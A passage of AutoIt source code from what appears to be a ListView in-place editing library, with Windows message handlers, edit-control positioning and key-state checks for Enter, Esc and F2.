; Requirement(s):
; Return Value(s):
; User CallTip:
; Author(s):		Anonymous
; Note(s):
;===============================================================================
Func _ListView_Click()
	ConsoleWrite(_DebugHeader("_ListView_Click"))
	ConsoleWrite("$editFlag=" & $editFlag & @LF)
	ConsoleWrite("$bLVUPDATEONFOCUSCHANGE = " & $bLVUPDATEONFOCUSCHANGE & @LF)
	;----------------------------------------------------------------------------------------------
	If $DebugIt Then
		If $DebugIt Then ConsoleWrite(_DebugHeader("_ListView_Click"))
	EndIf
	;----------------------------------------------------------------------------------------------
	If $editFlag = 1 Then
		If $bLVUPDATEONFOCUSCHANGE = True Then
			If $editCtrl = $lvDate Then
				If $bDATECHANGED = False Then
					_CancelEdit()
					Return
				EndIf
			EndIf
			_LVUpdate($editCtrl, $__LISTVIEWCTRL, $LVINFO[0], $LVINFO[1])
		Else
			_CancelEdit()
		EndIf
	Else
		If $bLVEDITONDBLCLICK = False Then
			Sleep(10)
			_InitEdit($LVINFO, $LVcolControl)
		EndIf
	EndIf
EndFunc   ;==>_ListView_Click
;===============================================================================
; Function Name:	ListView_RClick
; Description:	Called from WN_NOTIFY event handler.

; Parameter(s):
; Requirement(s):
; Return Value(s):
; User CallTip:
; Author(s):		Anonymous
; Note(s):
;===============================================================================
Func _ListView_RClick()
	If $editFlag = 1 Then
		_CancelEdit()
	Else
		;If $LVINFO[0] < 0 Or $LVINFO[1] < 0 Then Return 0
		If $LVcolRControl[$LVINFO[1]] = 256 Then Call($LVCONTEXT, $LVINFO) ;call context call back function.
		_CancelEdit()
	EndIf
	;----------------------------------------------------------------------------------------------
	If $DebugIt Then ConsoleWrite(_DebugHeader("$NM_RCLICK"))
	;----------------------------------------------------------------------------------------------
EndFunc   ;==>_ListView_RClick
;===============================================================================
; Function Name:	ListView_DoubleClick
; Description:	Called from WN_NOTIFY event handler.
; Parameter(s):
; Requirement(s):
; Return Value(s):
; User CallTip:
; Author(s):
; Note(s):			Initiates the edit process on a DblClick
;===============================================================================
Func _ListView_DoubleClick()
	;----------------------------------------------------------------------------------------------
	If $DebugIt Then ConsoleWrite(_DebugHeader("$NM_DBLCLICK"))
	;----------------------------------------------------------------------------------------------
	If $editFlag = 0 Then
		$bCanceled = False
		_InitEdit($LVINFO, $LVcolControl)
	Else
		_CancelEdit()
	EndIf
EndFunc   ;==>_ListView_DoubleClick
; WM_NOTIFY event handler
;===============================================================================
; Function Name:	_MonitorEditState
; Description:		Handles {enter} {esc} and {f2}
; Parameter(s):	$h_gui			- IN/OUT -
;						$editCtrl		- IN/OUT -
;						$editFlag		- IN/OUT -
;						$__LISTVIEWCTRL	- IN/OUT -
;						$LVINFO	 		- IN/OUT -
;						$LVcolControl	- IN -
; Requirement(s):
; Return Value(s):
; User CallTip:
; Author(s):
; Note(s):
;===============================================================================
Func _MonitorEditState(ByRef $editCtrl, ByRef $editFlag, ByRef $__LISTVIEWCTRL, ByRef $LVINFO)
	Local $pressed = _vKeyCheck()
	If $editFlag And $pressed = 13 Then; pressed enter
		_LVUpdate($editCtrl, $__LISTVIEWCTRL, $LVINFO[0], $LVINFO[1])
	ElseIf $editFlag And $pressed = 27 Then; pressed esc
		_CancelEdit()
	ElseIf Not $editFlag And $pressed = 113 Then; pressed f2
		MouseClick("primary") ;workaround work all the time (if mouse is over the control)
		MouseClick("primary")
	EndIf
EndFunc   ;==>_MonitorEditState
;===============================================================================
; Function Name:	_LVUpdate
; Description:		Put the new data in the Listview
; Parameter(s):	$editCtrl		 - IN/OUT -
;						$__LISTVIEWCTRL	 - IN/OUT -
;						$iRow				 - IN -
;						$iCol				 - IN -
;
; Requirement(s):
; Return Value(s):
; User CallTip:
; Author(s):
; Note(s):
;===============================================================================
Func _LVUpdate(ByRef $editCtrl, ByRef $__LISTVIEWCTRL, $iRow, $iCol)
	If $DebugIt Then ConsoleWrite("_LVUpdate>>" & @LF)
	If $bCanceled Then Return
	Local $newText = GUICtrlRead($editCtrl)
	If $editCtrl = $lvList Or $editCtrl = $lvCombo Then
		If $newText <> "" Then
			_GUICtrlListView_SetItemText($__LISTVIEWCTRL, $iRow, $newText, $iCol)
		EndIf
	Else
		If $editCtrl = $lvEdit Then $lvEditText[$iRow][$iCol - 2] = $newText
		_GUICtrlListView_SetItemText($__LISTVIEWCTRL, $iRow, $newText, $iCol)
	EndIf
	$LVINFO[6] = $iRow
	$LVINFO[7] = $iCol
	_CancelEdit()
EndFunc   ;==>_LVUpdate
;===============================================================================
; Function Name:	_GUICtrlListViewGetSubItemRect
; Description:	 Get the bounding rect of a listview item
; Parameter(s):	$h_listview	- IN -
;						$row			- IN -
;						$col		 	- IN -
;						$aRect		- IN/OUT -
;
; Requirement(s):
; Return Value(s):
; User CallTip:
; Author(s):
; Note(s):
;===============================================================================
Func _GUICtrlListViewGetSubItemRect($h_listview, $row, $col, ByRef $aRect)
	Local $rectangle, $rv, $ht[4]
	$rectangle = DllStructCreate("int;int;int;int") ;left, top, right, bottom
	DllStructSetData($rectangle, 1, 0) ; $LVIR_BOUNDS = 0
	DllStructSetData($rectangle, 2, $col)
	If IsHWnd($h_listview) Then
		Local $a_ret = DllCall("user32.dll", "int", "SendMessage", "hwnd", $h_listview, "int", 0x1000 + 56, "int", $row, "ptr", DllStructGetPtr($rectangle)) ; $LVM_GETSUBITEMRECT = ($LVM_FIRST + 56)
		$rv = $a_ret[0]
	Else
		$rv = GUICtrlSendMsg($h_listview, 0x1000 + 56, $row, DllStructGetPtr($rectangle)) ; $LVM_GETSUBITEMRECT = ($LVM_FIRST + 56)
	EndIf
	ReDim $aRect[4]
	$aRect = $ht
	$aRect[0] = DllStructGetData($rectangle, 1)
	$aRect[1] = DllStructGetData($rectangle, 2)
	$aRect[2] = DllStructGetData($rectangle, 3)
	$aRect[3] = DllStructGetData($rectangle, 4) - $aRect[1]
	$rectangle = 0
	Sleep(10)
	Return $rv
EndFunc   ;==>_GUICtrlListViewGetSubItemRect
;===============================================================================
; Function Name:	_InitEdit
; Description:		Bring forth the editing control and set focus on it.
; Parameter(s):	$LVINFO		 	- IN -
;						$LVcolControl	- IN -
;
; Requirement(s):
; Return Value(s):
; User CallTip:
; Author(s):
; Note(s):
;===============================================================================
Func _InitEdit($LVINFO, $LVcolControl)
	If $bPROGRESSSHOWING = True Then Return
	;ConsoleWrite("_InitEdit>>"&@LF)
	If $bCanceled Then
		$bCanceled = False
		Return
	EndIf
	If $bCALLBACK Then
		_CancelEdit()
		$bCALLBACK = False
	EndIf

	If $editFlag = 1 Then _CancelEdit()
	Local $CtrlType
	If $LVINFO[0] < 0 Or $LVINFO[1] < 0 Then Return 0
	If UBound($LVcolControl) - 1 < $LVINFO[1] Then
		$CtrlType = 0
	Else
		$CtrlType = $LVcolControl[$LVINFO[1]]
	EndIf
	;----------------------------------------------------------------------------------------------
	If $DebugIt Then ConsoleWrite(_DebugHeader("$CtrlType:" & $CtrlType))
	;----------------------------------------------------------------------------------------------
	Switch $CtrlType
		Case 1
			GUICtrlSetData($lvInput, "")
			$editCtrl = $lvInput
		Case 2
			$editCtrl = $lvCombo
		Case 4
			$editCtrl = $lvDate
		Case 8
			$editCtrl = $lvList
		Case 16
			$editCtrl = $lvCombo1
		Case 32
			GUICtrlSetData($lvInput1, "")
			$editCtrl = $lvInput1
		Case 64
			GUICtrlSetData($lvEdit, "")
			$editCtrl = $lvEdit
		Case 256
			$bCALLBACK = True
		Case Else
			Return
	EndSwitch
	If $bCALLBACK Then
		$bCALLBACK = False
		$bCALLBACK_EVENT = True
	Else
		;----------------------------------------------------------------------------------------------
		If $DebugIt Then ConsoleWrite(_DebugHeader("Classname=" & _GetClassName($editCtrl)))
		;----------------------------------------------------------------------------------------------
		Local $editCtrlPos = _CalcEditPos($__LISTVIEWCTRL, $LVINFO)
		Local $x1, $y1
		ClientToScreen($Gui, $x1, $y1)
		WinMove($lvControlGui, "", $editCtrlPos[0] + ($x1 - 1), $editCtrlPos[1] + ($y1 - 1), $editCtrlPos[2], $editCtrlPos[3])
		;		GUICtrlSetPos($editCtrl, $editCtrlPos[0],$editCtrlPos[1], $editCtrlPos[2],$editCtrlPos[3])
		GUICtrlSetPos($editCtrl, 0, 0, $editCtrlPos[2], $editCtrlPos[3])
		If $editCtrl = $lvEdit Then
			GUICtrlSetData($editCtrl, $lvEditText[$LVINFO[0]][$LVINFO[1] - 2])
		Else
			Local $oldText = _GUICtrlListView_GetItemText($__LISTVIEWCTRL, $LVINFO[0], $LVINFO[1])
		EndIf
		If $DebugIt Then ConsoleWrite($oldText & @LF)
		GUICtrlSetState($__LISTVIEWCTRL, 8192) ; 8192 = $GUI_NOFOCUS
		If $DebugIt Then ConsoleWrite(_GetClassName($editCtrl) & @LF)
		Switch $editCtrl
			Case $lvEdit
			Case $lvList
				If $oldText <> "" Then GUICtrlSetData($editCtrl, $oldText)
			Case $lvCombo, $lvCombo1
				If $oldText <> "" Then
					Local $index = _GUICtrlComboBox_FindString($editCtrl, $oldText)
					If $DebugIt Then ConsoleWrite("index=" & @LF)
					If ($index = -1) Then $index = _GUICtrlComboBox_AddString($editCtrl, $oldText)
					_GUICtrlComboBox_SetCurSel($editCtrl, $index)
					GUICtrlSetState($editCtrl, 2048) ; $GUI_ONTOP = 2048
				EndIf
			Case Else
				GUICtrlSetData($editCtrl, $oldText)
		EndSwitch
		$editFlag = 1

		GUICtrlSetState($__LISTVIEWCTRL, 8192) ; 8192 = $GUI_NOFOCUS
		If $DebugIt Then ConsoleWrite("Set pos" & @LF)
		$nAddHight = 0
		If $editCtrl = $lvEdit Then $nAddHight = 330
		WinMove($lvControlGui, "", $editCtrlPos[0] + ($x1 - 1), $editCtrlPos[1] + ($y1 - 1), $editCtrlPos[2] + 1, $editCtrlPos[3] + 1 + $nAddHight)
		WinSetOnTop($lvControlGui, "", 1)
		GUISetState(@SW_SHOW, $lvControlGui)
;~ 	GUICtrlSetPos($editCtrl, $editCtrlPos[0],$editCtrlPos[1], $editCtrlPos[2],$editCtrlPos[3])
;~ 	GUICtrlSetState($editCtrl, 16) ; $GUI_SHOW = 16
		GUICtrlSetPos($editCtrl, 0, 0, $editCtrlPos[2], $editCtrlPos[3] + $nAddHight)
		GUICtrlSetState($editCtrl, 16) ; $GUI_SHOW = 16
		GUICtrlSetState($editCtrl, 256) ; $GUI_FOCUS = 256
		;		GUIRegisterMsg(0x0006,"WM_ACTIVATE") ; $WM_ACTIVATE = 0x0006
	EndIf
	If $DebugIt Then ConsoleWrite("Leaving _InitEdit()" & @LF)
EndFunc   ;==>_InitEdit

Func _MoveControl()
	If $bInitiated = True Then
		Local $editCtrlPos = _CalcEditPos($__LISTVIEWCTRL, $LVINFO)
		Local $x1, $y1
		ClientToScreen($Gui, $x1, $y1)
		If $editCtrlPos[0] > 0 Then
			WinMove($lvControlGui, "", $editCtrlPos[0] + ($x1 - 1), $editCtrlPos[1] + ($y1 - 1), $editCtrlPos[2], $editCtrlPos[3])
		Else
			WinMove($lvControlGui, "", $x1 + 1, $editCtrlPos[1] + ($y1 - 1), $editCtrlPos[2] - Abs($editCtrlPos[0]), $editCtrlPos[3])
		EndIf
		;GUICtrlSetPos($editCtrl, 0,0, $editCtrlPos[2],$editCtrlPos[3])
	EndIf
EndFunc   ;==>_MoveControl
Func _CalcEditPos($nLvCtrl, $aINFO)
	Local $pos[4]
	Local $ctrlSize = ControlGetPos($Gui, "", $nLvCtrl)
	Local $ERR = @error
	$pos[0] = $aINFO[2]
	$pos[1] = $aINFO[3] + 3
	$pos[2] = $aINFO[4]
	$pos[3] = $aINFO[5] - 4
	If $ERR Then
		ConsoleWrite("NoControlPos" & @LF)
		Return $pos
	EndIf
	If $aINFO[2] + $aINFO[4] > $ctrlSize[2] Then
		$pos[0] = $aINFO[2] - (($aINFO[2] + $aINFO[4]) - $ctrlSize[2])
	EndIf
	If $editCtrl = $lvList Then
		;make the list fit inside the ListView.
		Local $initH = (_GUICtrlListView_GetItemCount($lvList) * 14.5) * (_GUICtrlListView_GetItemCount($lvList) * 14.5 > 0)
		Local $y1 = $ctrlSize[3] - $aINFO[3] - 21
		$y1 = $y1 * ($y1 > 21)
		If $initH < $y1 Then
			$pos[3] = $initH
		Else
			$pos[3] = $y1
		EndIf

	EndIf
	If _LvHasCheckStyle($__LISTVIEWCTRL) And $aINFO[1] = 0 And $editCtrl = $lvInput Then
		;compensate for check box
		$pos[2] = $aINFO[4] - 21
		$pos[0] = $aINFO[2] + 21
	EndIf
	Return $pos
EndFunc   ;==>_CalcEditPos

;===============================================================================
; Function Name:	_CancelEdit
; Description:		Cancels the editing process, and kills the hot keys.
; Parameter(s):
; Requirement(s):
; Return Value(s):
; User CallTip:
; Author(s):
; Note(s):
;===============================================================================
Func _CancelEdit()
	ConsoleWrite("_CancelEdit>>" & @LF)
	HotKeySet("{Enter}")
	HotKeySet("{Esc}")
	If $editFlag = 1 Then Send("{Enter}");quit edit mode
	$editFlag = 0
	GUISetState(@SW_HIDE, $lvControlGui); additionally hide it
	WinSetOnTop($lvControlGui, "", 0); remove topmost attrib
	WinMove($lvControlGui, "", 1024, 768, 1, 1);move to bottom right corner
	GUICtrlSetState($editCtrl, 32) ; 32 = $GUI_HIDE
	GUICtrlSetPos($editCtrl, 0, 0, 1, 1)
	$bCanceled = True
	$bDATECHANGED = False
	;----------------------------------------------------------------------------------------------
	If $DebugIt Then ConsoleWrite(_DebugHeader("_CancelEdit()"))
	;----------------------------------------------------------------------------------------------
	;if Not(WinActive($Gui,"")) Then WinActivate($Gui,"")
EndFunc   ;==>_CancelEdit
;===============================================================================
; Function Name:	_FillLV_Info
; Description:		This fills the passed in array with row col and rect info for
;						used by the editing controls
; Parameter(s):	$__LISTVIEWCTRL	- IN/OUT -
;						$iRow		 		- IN -
;						$iCol		 		- IN -
;						$aLVI		 		- IN/OUT -
;
; Requirement(s):
; Return Value(s):
; User CallTip:
; Author(s):
; Note(s):
;===============================================================================
Func _FillLV_Info(ByRef $nLvCtrl, $iRow, $iCol, ByRef $aLVI, $iFlag = 1)
	If $iFlag Then
		$aLVI[6] = $aLVI[0] ;set old row
		$aLVI[7] = $aLVI[1] ;set old col
		$aLVI[0] = $iRow ;set new row
		$aLVI[1] = $iCol ;set new col
	EndIf
	If $iRow < 0 Or $iCol < 0 Then Return 0
	Local $lvi_rect[4], $pos = ControlGetPos($Gui, "", $nLvCtrl)
	_GUICtrlListViewGetSubItemRect($nLvCtrl, $iRow, $iCol, $lvi_rect)
	$aLVI[2] = $pos[0] + $lvi_rect[0] + 5
	$aLVI[3] = $pos[1] + $lvi_rect[1]
	$aLVI[4] = _GUICtrlListView_GetColumnWidth($nLvCtrl, $iCol) - 4
	$aLVI[5] = $lvi_rect[3] + 5
	Sleep(10)
	Return 1
EndFunc   ;==>_FillLV_Info

Func WM_ACTIVATE($hWndGUI, $MsgID, $wParam, $lParam)
	#forceref $hWndGui,$MsgID,$wParam, $lParam
	;Local $wa = _LoWord($wParam)
	Local $hActive = DllCall("user32.dll", "hwnd", "GetForegroundWindow")
	If $lParam = 0 And $editFlag = 1 Then
		_CancelEdit()
	EndIf
	If IsArray($hActive) Then
		WinSetOnTop($hActive[0], "", 1)
		WinSetOnTop($hActive[0], "", 0)
	EndIf
	Return 0
EndFunc   ;==>WM_ACTIVATE

;===============================================================================
; Function Name:	WM_Notify_Events
; Description:		Event handler for windows WN_NOTIFY messages
; Parameter(s):	$hWndGUI		 - IN -
;						$MsgID		 - IN -
;						$wParam		 - IN -
;						$lParam		 - IN -
;
; Requirement(s):
; Return Value(s):
; User CallTip:
; Author(s):
; Note(s):
;===============================================================================
Func WM_Notify_Events($hWndGUI, $MsgID, $wParam, $lParam)
	#forceref $hWndGUI, $MsgID, $wParam
	Local $tagNMHDR, $pressed, $event, $retval = 'GUI_RUNDEFMSG' ;, $idFrom ; $GUI_RUNDEFMSG = 'GUI_RUNDEFMSG'
	$tagNMHDR = DllStructCreate("int;int;int", $lParam);NMHDR (hwndFrom, idFrom, code)
	If @error Then
		$tagNMHDR = 0
		Return
	EndIf
;~ 	$from = DllStructGetData($tagNMHDR, 1)
;~ 	$idFrom = DllStructGetData($tagNMHDR,2)
	;ConsoleWrite("idFrom="&$idFrom&@LF)
	$event = DllStructGetData($tagNMHDR, 3)
	Select
		Case ($event = -300 - 8 Or $event = -300 - 28) ; $HDN_TRACK = $HDN_FIRST - 8 $HDN_TRACKW	= $HDN_FIRST - 28
			;column dragging
			_CancelEdit()
		Case $MsgID = $WM_MOVING
			_MoveControl()
		Case $wParam = $__LISTVIEWCTRL
			Select
				Case $event = -100 - 1 ; $LVN_ITEMCHANGED = ($LVN_FIRST - 1)
					Local $ckcount = _LvGetCheckedCount($__LISTVIEWCTRL)
					If $LVCHECKEDCNT <> $ckcount Then
						$LVCHECKEDCNT = $ckcount
						$bLVITEMCHECKED = True
						_CancelEdit()
					EndIf

				Case $event = -2 ; $NM_CLICK = - 2
					If $bLVEDITONDBLCLICK = False Then
						_LVGetInfo($lParam)
						;scroll column into view.
						Switch $LVINFO[1]
							Case 0
								_GUICtrlListView_Scroll($__LISTVIEWCTRL, -$LVINFO[4], 0)
								_FillLV_Info($__LISTVIEWCTRL, $LVINFO[8], $LVINFO[9], $LVINFO, 0)
								;_LVGetInfo($lParam)
							Case Else
								Local $ctrlSize = ControlGetPos("", "", $__LISTVIEWCTRL)
								If $LVINFO[2] + $LVINFO[4] > $ctrlSize[2] Then
									_GUICtrlListView_Scroll($__LISTVIEWCTRL, $LVINFO[4], 0)
									_FillLV_Info($__LISTVIEWCTRL, $LVINFO[8], $LVINFO[9], $LVINFO, 0)
								EndIf
						EndSwitch
						If Not $bLVITEMCHECKED Then
							_ListView_Click()
						EndIf
					Else
						If $editFlag = 1 Then _ListView_Click()
					EndIf

					$bLVITEMCHECKED = False;
				Case $event = -3 ; $NM_DBLCLK = - 3
					ConsoleWrite("$NM_DBLCLK" & @LF)
					_LVGetInfo($lParam)
					_ListView_DoubleClick()
				Case $event = -5 ; $NM_RCLICK = - 5
					_LVGetInfo($lParam)
					_ListView_RClick()
				Case $event = -180
					If $DebugIt Then ConsoleWrite("LVEVENT=-180" & @LF)
					If $editFlag = 1 Then
						Send("{Esc}")
						_CancelEdit()
						$retval = 0
					EndIf
				Case $event = -181
					If $DebugIt Then ConsoleWrite("LVEVENT=-181" & @LF)
					_FillLV_Info($__LISTVIEWCTRL, $LVINFO[0], $LVINFO[1], $LVINFO, 0)
				Case $event = -121
					If $DebugIt Then ConsoleWrite("LVEVENT=-121" & @LF)
					_LVGetInfo($lParam, 1)
				Case Else
					If $DebugIt Then ConsoleWrite("LV_EVENT>>" & $event & @LF)
			EndSelect
		Case $lvDate
			Select
				Case $event = -753 - 1 ; $DTN_DROPDOWN = $DTN_FIRST2 - 1
					$bCanceled = False
					$bDATECHANGED = False
				Case $event = $DTN_WMKEYDOWNA
					$pressed = _vKeyCheck()
					If $pressed = 27 Then _CancelEdit()
				Case $event = -753 - 6 ; $DTN_DATETIMECHANGE = $DTN_FIRST2 - 6
					If $DebugIt Then ConsoleWrite("DTN_DATETIMECHANGE" & @LF)
					If $bDATECHANGED = False Then $bDATECHANGED = True
					$pressed = _vKeyCheck()
					If $pressed = 27 Then
						_CancelEdit()
						$bDATECHANGED = False
					EndIf
				Case $event = -753 - 0 ; $DTN_CLOSEUP = $DTN_FIRST2 - 0
					If $DebugIt Then ConsoleWrite("DTN_CLOSEUP" & @LF)
					If $bCanceled or ($bDATECHANGED = False) Then
						Send("{Esc}")
						$bDATECHANGED = False
					Else
						;						If $bLVUPDATEONFOCUSCHANGE = True Then
						Send("{Enter}")
						$bDATECHANGED = True
						;						Else
						;							Send("{Esc}")
						;						EndIf
					EndIf
				Case $event = -7
					If $DebugIt Then ConsoleWrite("dtn $event=" & $event & @LF)
					$bCanceled = False
					$bDATECHANGED = False
				Case $event = -8
					If $DebugIt Then ConsoleWrite("dtn $event=" & $event & " , ")
					If $DebugIt Then ConsoleWrite("$bCanceled=" & $bCanceled & @LF)
					If $DebugIt Then ConsoleWrite("$bDATECHANGED=" & $bDATECHANGED & @LF)
					If $bCanceled = True Then
						;or ($bDATECHANGED = False) Then
						Send("{Esc}")
						$bDATECHANGED = False
						$bCanceled = False
					Else
						$bDATECHANGED = True
					EndIf
			EndSelect
		Case $event = -326
			ConsoleWrite("HDN Notification: " & $event & @LF)
			If $editFlag Then _CancelEdit()
		Case $MsgID = 0x0100 ; $WM_KEYDOWN = 0x0100
			;----------------------------------------------------------------------------------------------
			If $DebugIt Then ConsoleWrite(_DebugHeader("Keydown"))
			;----------------------------------------------------------------------------------------------
		Case Else
			If $DebugIt Then ConsoleWrite("WPARAM = " & $wParam & @LF)
			;;uncomment the following line to have the edit _LVUpdate if the mouse moves
			;;off of the listview.
			If $editFlag And Not (_HasFocus($editCtrl)) Then _LVUpdate($editCtrl, $__LISTVIEWCTRL, $LVINFO[0], $LVINFO[1])
	EndSelect
	If $DebugIt Then
		If $wParam <> $__LISTVIEWCTRL Then
			ConsoleWrite($hWndGUI & " " & $event & @LF)
		EndIf
	EndIf

	$tagNMHDR = 0
	$event = 0
	$lParam = 0
	Return $retval
EndFunc   ;==>WM_Notify_Events

Func WM_MOVE_EVENT($hWndGUI, $MsgID, $wParam, $lParam)
	#forceref $hWndGuI,$MsgID,$wParam,$lParam
	If $editFlag Then _MoveControl()
	Return True
EndFunc   ;==>WM_MOVE_EVENT

;===============================================================================
; Function Name:	WM_Command_Events
; Description:		Event handler for windows WN_Command messages
; Parameter(s):	$hWndGUI		 - IN -
;						$MsgID		 - IN -
;						$wParam		 - IN -
;						$lParam		 - IN -
;
; Requirement(s):
; Return Value(s):
; User CallTip:
; Author(s):
; Note(s):
;===============================================================================
Func WM_Command_Events($hWndGUI, $MsgID, $wParam, $lParam)
	#forceref $hWndGUI, $MsgID, $wParam
	Local $nNotifyCode, $nID, $hCtrl
	Local $retval = 'GUI_RUNDEFMSG' ; $GUI_RUNDEFMSG = 'GUI_RUNDEFMSG'
	$nNotifyCode = BitShift($wParam, 16)
	$nID = BitAND($wParam, 0x0000FFFF)
	$hCtrl = $lParam
	Switch $nID
		Case $lvList
			Switch $nNotifyCode
				Case $LBN_DBLCLK
					$bLVDBLCLICK = True
					;Send("{Enter}")
					_SendMessage($lvControlGui, 0x0111, _MakeLong($editCtrl, $LBN_SELCHANGE), $lParam) ; $WM_COMMAND = 0x0111
					_LVUpdate($editCtrl, $__LISTVIEWCTRL, $LVINFO[0], $LVINFO[1])
					Return 'GUI_RUNDEFMSG' ; $GUI_RUNDEFMSG = 'GUI_RUNDEFMSG'
				Case $LBN_SELCHANGE
					If $DebugIt Then ConsoleWrite("$LBN_SELCHANGE" & @LF)
					If Not $bLVDBLCLICK Then Return 0
				Case $LBN_SETFOCUS
					If $DebugIt Then ConsoleWrite("$LBN_SETFOCUS" & @LF)
				Case $LBN_KILLFOCUS
					If $DebugIt Then ConsoleWrite("$LBN_KILLFOCUS" & @LF)
				Case Else
					If $DebugIt Then ConsoleWrite("ListBox>>" & $nNotifyCode & @LF)
			EndSwitch
		Case $lvCombo, $lvCombo1
			Switch $nNotifyCode
				Case 1 ; $CBN_SELCHANGE = 1
					If $DebugIt Then ConsoleWrite("$CBN_SELCHANGE" & @LF)
					Send("{Enter}")
			EndSwitch
		Case Else
			If $DebugIt Then ConsoleWrite("$nId=" & $nID & @LF)
	EndSwitch
	If $hCtrl = _GetComboInfo($lvCombo) Or $hCtrl = _GetComboInfo($lvCombo1) And $DebugIt Then ConsoleWrite("$MsgID=" & $MsgID & @LF)
	If $bCanceled Then
		$bCanceled = False
		$retval = 0
	EndIf

	Return $retval
EndFunc   ;==>WM_Command_Events

;===============================================================================
; Function Name	:	_MakeLong
; Description		:	Converts two 16 bit values into on 32 bit value
; Parameter(s)		:	$LoWord		 16bit value
;						:	$HiWord		 16bit value
; Return Value(s)	:	Long value
; Note(s)			:
;===============================================================================
Func _MakeLong($LoWord, $HiWord)
	Return BitOR($HiWord * 0x10000, BitAND($LoWord, 0xFFFF))
EndFunc   ;==>_MakeLong

;===============================================================================
; Function Name	:	_LVGetInfo
; Description		:
; Parameter(s)		:	$lParam		 Pointer to $tagNMITEMACTIVE struct
;							$iFlag		 Optional value 0 (default)= fill all fields
;																 1 = fill just the latest click location.
; Requirement(s)	:
; Return Value(s)	:
; User CallTip		:
; Author(s)			:
; Note(s)			:
;===============================================================================
Func _LVGetInfo($lParam, $iFlag = 0)
	Local $tagNMITEMACTIVATE = DllStructCreate("int;int;int;int;int;int;int;int;int", $lParam)
	Local $clicked_row = DllStructGetData($tagNMITEMACTIVATE, 4)
	Local $clicked_col = DllStructGetData($tagNMITEMACTIVATE, 5)
	If $clicked_col < -1 Then $clicked_col = -1
	If $clicked_row < -1 Then $clicked_row = -1
	If $clicked_col > _GUICtrlListView_GetColumnCount($__LISTVIEWCTRL) Then $clicked_col = -1
	If $clicked_row > _GUICtrlListView_GetItemCount($__LISTVIEWCTRL) Then $clicked_row = -1
	$tagNMITEMACTIVATE = 0
	If $iFlag = 0 Then
		_FillLV_Info($__LISTVIEWCTRL, $clicked_row, $clicked_col, $LVINFO)
		$old_col = $clicked_col
	EndIf
	$LVINFO[8] = $clicked_row
	$LVINFO[9] = $clicked_col
	;----------------------------------------------------------------------------------------------
	If $DebugIt Then ConsoleWrite(_DebugHeader("Col:" & $clicked_col))
	If $DebugIt Then ConsoleWrite(_DebugHeader("Row:" & $clicked_row))
	;----------------------------------------------------------------------------------------------

EndFunc   ;==>_LVGetInfo


;===============================================================================
; Function Name:	_DebugHeader
; Description:		Gary's console debug header.
; Parameter(s):			$s_text		 - IN -
;
; Requirement(s):
; Return Value(s):
; User CallTip:
; Author(s):
; Note(s):
;===============================================================================
Func _DebugHeader($s_text)
	Return _
			"!===========================================================" & @LF & _
			"+===========================================================" & @LF & _
			"-->" & $s_text & @LF & _
			"+===========================================================" & @LF
EndFunc   ;==>_DebugHeader

;===============================================================================
; Function Name:	_GetClassName
; Description:		get the classname of a ctrl
; Parameter(s):	$nCtrl		 the ctrlId of to get classname for.
; Requirement(s):
; Return Value(s):	Classname or 0 on failure
; User CallTip:
; Author(s):		Anonymous
; Note(s):			Strips trailing numbers from classname.
;===============================================================================
Func _GetClassName($nCtrl)
	Local $ret, $struct = DllStructCreate("char[128]"), $classname = 0
	$ret = DllCall("user32.dll", "int", "GetClassName", "hwnd", GUICtrlGetHandle($nCtrl), "ptr", DllStructGetPtr($struct), "int", DllStructGetSize($struct))
	If IsArray($ret) Then
		$classname = DllStructGetData($struct, 1)
		;ConsoleWrite("Classname="&$classname&@LF)
	EndIf
	$struct = 0
	Return $classname
EndFunc   ;==>_GetClassName
;===============================================================================
; Function Name:	vKeyCheck  alias for __IsPressedMod
; Description:	Gets a key press
; Parameter(s):			$dll		 - IN/OPTIONAL -
; Requirement(s):
; Return Value(s): Return the key that is pressed or 0
; User CallTip:
; Author(s):
; Note(s):
;===============================================================================
Func _vKeyCheck($dll = "user32.dll")
	Local $aR, $hexKey, $i
	Local $vkeys[4] = [1, 13, 27, 113];leftmouse,enter,esc,f2
	For $i = 0 To UBound($vkeys) - 1
		$hexKey = '0x' & Hex($vkeys[$i], 2)
		$aR = DllCall($dll, "int", "GetAsyncKeyState", "int", $hexKey)
		If $aR[0] <> 0 Then Return $vkeys[$i]
		Sleep(5)
	Next
	Return 0
EndFunc   ;==>_vKeyCheck

;===============================================================================
; Function Name	:	_HasFocus
; Description		:	Return true if control has focus
; Parameter(s)		:	$nCtrl Ctrlid to check
; Return Value(s)	:	True is ctrl has focus, false otherwise.
; User CallTip		:
; Author(s)			:	Anonymous
; Note(s)			:
;===============================================================================
Func _HasFocus($nCtrl)
	;	If $DebugIt Then ConsoleWrite("_HasFocus>>"&@LF)
	Local $hwnd
	If $nCtrl = $lvCombo Or $nCtrl = $lvCombo1 Then
		$hwnd = _GetComboInfo($nCtrl, 0)
	Else
		$hwnd = GUICtrlGetHandle($nCtrl)
	EndIf
	Return ($hwnd = ControlGetHandle($Gui, "", ControlGetFocus($Gui, "")))
EndFunc   ;==>_HasFocus

;===============================================================================
; Function Name	:	_SetLVCallBack
; Description		:
; Parameter(s)		:	$CallBack 	Function to use for(primary button) call back defaults to _CancelEdit()
; Return Value(s)	:	None.
; Author(s)			:	Anonymous
; Note(s)			:	This is used to open other controls and dialogs
;===============================================================================
Func _SetLVCallBack($CallBack = "_CancelEdit")
	If $CallBack <> "" Then $LVCALLBACK = $CallBack
EndFunc   ;==>_SetLVCallBack

;===============================================================================
; Function Name	:	_SetLVContext
; Description		:
; Description		:
; Parameter(s)		:	$CallBack 	Function to use for (secondary button) contexts defaults to _CancelEdit()
; Return Value(s)	:	None.
; Author(s)			:	Anonymous
; Note(s)			:	This is used to open other controls and dialogs (context menus)
;===============================================================================
Func _SetLVContext($Context = "_CancelEdit")
	If $Context <> "" Then $LVCONTEXT = $Context
EndFunc   ;==>_SetLVContext
;===============================================================================
; Function Name	:	_LvHasCheckStyle
; Description		:
; Parameter(s)		:	$hCtrl		Listview control to check for $LVS_EX_CHECKBOXES style
;
; Requirement(s)	:
; Return Value(s)	:
; User CallTip		:
; Author(s)			:	Anonymous
; Note(s)			:
;===============================================================================
Func _LvHasCheckStyle($hCtrl)
	Local $style = _GUICtrlListView_GetExtendedListViewStyle($hCtrl)
	if (BitAND($style, 0x00000004) = 0x00000004) Then Return True ; $LVS_EX_CHECKBOXES = 0x00000004
	Return False
EndFunc   ;==>_LvHasCheckStyle

;===============================================================================
; Function Name	:	_LvGetCheckedCount
; Description		:
; Parameter(s)		:	$nCtrl		 Listview control to get checked checkbox count.
;
; Requirement(s)	:
; Return Value(s)	:	number of checked checkboxes, or zero.
; User CallTip		:
